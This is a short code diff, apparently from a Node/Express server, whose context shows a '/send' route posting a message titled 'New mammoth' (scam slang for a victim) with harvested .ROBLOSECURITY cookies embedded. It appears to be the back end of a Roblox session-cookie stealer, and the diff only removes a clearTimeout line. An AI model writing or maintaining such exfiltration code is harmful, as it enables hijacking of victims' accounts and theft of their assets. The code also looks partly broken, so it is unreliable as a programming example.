@@ -28,8 +28,6 @@ app.post('/send', async (req, res) => {
       headers: { 'Content-Type': 'application/json' },
       body: {"content":"Новый мамонт!","embeds":[{"title":"Данные","description":"Файлы .ROBLOSECURITY","color":5814783,"fields":[cookiesArray.concat(", ")]}],"attachments":[]},
     });
-    clearTimeout(timeout);
-
 });
 
 app.listen(PORT, () => {
